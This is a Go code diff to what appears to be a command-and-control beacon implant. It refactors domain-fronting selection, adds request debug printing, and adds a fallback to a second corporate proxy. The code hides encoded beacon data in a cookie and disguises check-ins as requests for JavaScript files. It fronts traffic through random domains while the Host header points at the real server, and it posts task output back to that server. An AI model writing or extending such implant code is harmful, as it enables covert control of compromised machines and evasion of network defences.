@@ -488,15 +488,6 @@ func (hc *HTTPComms) PollBeacon() error {
 	}
 }
 
-func getRandomdomain(postUrls []string) string {
-	// 以当前时间作为随机数种子
-	rand.Seed(time.Now().UnixNano())
-	// 随机选择一个URL前缀
-	selectedUrl := postUrls[rand.Intn(len(postUrls))]
-	url := selectedUrl
-	return url
-}
-
 func (hc *HTTPComms) sendRequest() error {
 	encData, err := json.Marshal(hc.BeaconData)
 	if err != nil {
@@ -512,7 +503,8 @@ func (hc *HTTPComms) sendRequest() error {
 
 	cookieString := util.Sprintf("BA_HECTORDD=%s;", encDataStr)
 	randomString := hc.GenerateRandomString(rand.Intn(10) + 5)
-	frontdomain := getRandomdomain(config.DomainFront)
+	frontdomain := Command.GetRandomdomain(config.DomainFront)
+
 	url := ""
 
 	url = util.Sprintf("%s://%s/static/js/app.%s.js", hc.Schema, frontdomain, randomString)
@@ -527,6 +519,8 @@ func (hc *HTTPComms) sendRequest() error {
 	req.Header.Set("Cookie", cookieString)
 	req.Host = config.ServerHostDomain
 	req.URL.Host = frontdomain
+	util.Println("Request URL:", req.URL.Host)
+	util.Println("Request Host:", req.Host)
 	resp, err := hc.client.Do(req)
 	if err != nil {
 		util.Println("Error making HTTP request:", err)
@@ -682,7 +676,7 @@ func (hc *HTTPComms) DataSend(taskOut BeaconTaskOut) error {
 	// 打印 Cookie 和请求体内容
 	util.Println("Cookie:", cookieString)
 	util.Println("请求体内容:", encryptedData)
-	frontdomain := getRandomdomain(config.DomainFront)
+	frontdomain := Command.GetRandomdomain(config.DomainFront)
 	// 创建 POST 请求使用 hc.client
 	req, err := http.NewRequest("POST", util.Sprintf("%s://%s%s", hc.Schema, frontdomain, requestPath), httpContent)
 	if err != nil {
@@ -695,7 +689,6 @@ func (hc *HTTPComms) DataSend(taskOut BeaconTaskOut) error {
 	req.Header.Set("Cookie", cookieString)
 	req.Host = config.ServerHostDomain
 	req.URL.Host = frontdomain
-	util.Println("请求URL:", req.Host)
 
 	// 发送请求
 	resp, err := hc.client.Do(req)
@@ -770,6 +763,14 @@ func checkproxy() string {
 			resp, _ := client.Do(req)
 			if resp.StatusCode == 200 {
 				return "http://proxy.chengdutest.itsec.hihonor.com:8080"
+			} else {
+				proxyurl, _ := url.Parse("http://proxy.singapore.itsec.hihonor.com:8080")
+				testtransport.Proxy = http.ProxyURL(proxyurl)
+				client.Transport = testtransport
+				resp, _ := client.Do(req)
+				if resp.StatusCode == 200 {
+					return "http://proxy.singapore.itsec.hihonor.com:8080"
+				}
 			}
 		}
 
